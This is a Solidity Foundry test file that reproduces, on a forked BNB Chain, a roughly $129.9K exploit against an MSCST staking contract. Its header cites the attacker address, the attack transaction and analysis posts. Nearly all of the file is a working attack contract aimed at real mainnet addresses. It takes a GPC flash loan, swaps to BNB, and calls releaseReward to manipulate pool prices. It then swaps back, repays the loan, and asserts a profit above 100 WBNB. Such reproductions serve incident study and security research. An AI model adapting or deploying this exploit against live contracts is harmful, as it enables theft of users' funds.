// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$129.9K
// Attacker : https://bscscan.com/address/0xB0720D8541cD2b6fC35cCC39ec84e84383A7000b
// Attack Contract : https://bscscan.com/address/0x486da49a56b564B824ea140fa4a5fF74DE6CF34B
// Attack Tx : https://bscscan.com/tx/0x6c9ed4c2d81b6abfdf297b0cbc13585ed91f2a5e69e3545d3ea4316f50021b56
//
// @Analysis
// TenArmor : https://x.com/TenArmorAlert/status/2005509505988055471
// hklst4r : https://x.com/hklst4r/status/2005515461773885670

interface IMSCSTERC20 {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IMSCSTWBNB is IMSCSTERC20 {
    function deposit() external payable;
    function withdraw(
        uint256 amount
    ) external;
}

interface IMSCSTPair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IMSCSTRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IMSCSTStaking {
    function releaseReward(
        uint256 fee
    ) external;
}

contract MSCST_exp is Test {
    uint256 private constant FORK_BLOCK = 73_309_656 - 1;

    IMSCSTERC20 private constant WBNB = IMSCSTERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IMSCSTERC20 private constant GPC = IMSCSTERC20(0xD3c304697f63B279cd314F92c19cDBE5E5b1631A);

    MSCSTAttacker private attacker;

    function setUp() public {
        vm.createSelectFork("https://bsc-mainnet.public.blastapi.io", FORK_BLOCK);

        attacker = new MSCSTAttacker();

        vm.label(address(attacker), "MSCST attacker");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(GPC), "GPC");
    }

    function testExploit() public {
        uint256 balanceBefore = WBNB.balanceOf(address(attacker));

        attacker.exploit();

        uint256 profit = WBNB.balanceOf(address(attacker)) - balanceBefore;
        emit log_named_decimal_uint("Profit WBNB", profit, 18);

        assertGt(profit, 100 ether, "profit too low");
    }
}

contract MSCSTAttacker {
    IMSCSTRouter private constant ROUTER = IMSCSTRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMSCSTStaking private constant MSCST = IMSCSTStaking(0x91334D03DD9b9De8D48b50FE389337eEb759aeB1);

    IMSCSTWBNB private constant WBNB = IMSCSTWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IMSCSTERC20 private constant MSC = IMSCSTERC20(0x713630359Cc9046869aD1642a7b61c23956425cC);
    IMSCSTERC20 private constant GPC = IMSCSTERC20(0xD3c304697f63B279cd314F92c19cDBE5E5b1631A);

    IMSCSTPair private constant FLASH_PAIR = IMSCSTPair(0xe3cBa5C0A8efAeDce84751aF2EFDdCf071D311a9);

    uint256 private constant FLASH_AMOUNT = 0x26bf233d8ec1ba7c26592e;
    uint256 private constant REPAY_AMOUNT = 0x26d7ff66220ab71a4ba853;

    function exploit() external {
        FLASH_PAIR.swap(0, FLASH_AMOUNT, address(this), "MSCST");
    }

    function pancakeCall(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(FLASH_PAIR), "only flash pair");

        GPC.approve(address(ROUTER), type(uint256).max);
        WBNB.approve(address(ROUTER), type(uint256).max);

        address[] memory gpcToWbnb = new address[](2);
        gpcToWbnb[0] = address(GPC);
        gpcToWbnb[1] = address(WBNB);
        ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            GPC.balanceOf(address(this)), 0, gpcToWbnb, address(this), block.timestamp
        );

        MSCST.releaseReward(MSC.balanceOf(address(MSCST)));

        WBNB.deposit{value: address(this).balance}();

        address[] memory wbnbToGpc = new address[](2);
        wbnbToGpc[0] = address(WBNB);
        wbnbToGpc[1] = address(GPC);
        ROUTER.swapTokensForExactTokens(
            REPAY_AMOUNT, WBNB.balanceOf(address(this)), wbnbToGpc, address(this), block.timestamp
        );

        GPC.transfer(address(FLASH_PAIR), REPAY_AMOUNT);
    }

    receive() external payable {}
}
